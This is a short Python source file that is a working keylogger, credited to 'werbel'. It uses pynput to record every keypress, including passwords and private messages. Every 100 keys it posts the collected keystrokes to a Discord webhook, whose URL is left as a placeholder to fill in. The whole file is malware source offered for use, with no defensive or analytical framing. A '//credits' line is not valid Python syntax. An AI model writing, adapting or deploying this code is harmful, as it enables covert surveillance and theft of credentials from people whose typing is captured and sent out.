from pynput import keyboard
import requests
import json
//credits : werbel
def send_to_discord(keys):
    webhook_url = 'Your webhook >-< !!!! '
    data = {
        'content': "Lista klawiszy:\n" + ''.join(keys)
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    if response.status_code != 200:
        print('Failed to send message to Discord')
 
keys_pressed = []
words_count = 0
#made by werbel >_<!!!
def key_pressed(key):
    global words_count
    global keys_pressed
 
    try:
        char = key.char
        words_count += 1
        keys_pressed.append(char)
    except AttributeError:
        words_count += 1
        keys_pressed.append(f"<{key}>")
 
    if words_count % 100 == 0:
        send_to_discord(keys_pressed)
        keys_pressed = []
        words_count = 0
 
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()
